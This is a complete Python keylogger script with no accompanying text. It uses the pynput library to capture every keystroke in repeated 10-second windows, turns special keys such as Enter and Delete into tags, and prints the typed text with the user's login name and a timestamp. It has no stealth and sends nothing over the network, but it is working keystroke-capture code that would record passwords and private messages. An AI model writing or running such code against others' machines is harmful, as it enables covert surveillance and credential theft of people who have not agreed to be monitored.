from time import sleep, asctime, localtime
from os import getlogin
from pynput import keyboard

log = []

def on_press(key):
    special_lookup = {
        "Key.space": " ",
        "Key.tab": " ",
        "Key.enter": "<ENTER>",
        "Key.delete": "<DELETE>"
    }
    try:
        log.append(key.char)
    except AttributeError:
        if str(key) == "Key.backspace":
            try:
                log.pop()
            except IndexError:
                log.append("<BACKSPACE>")
        elif str(key) in special_lookup.keys():
            log.append(special_lookup[str(key)])

if __name__ == "__main__":
    while True:
        log = []
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        sleep(10)
        listener.stop()
        print(f"{getlogin()} -- {asctime(localtime())}: {''.join(log)}")
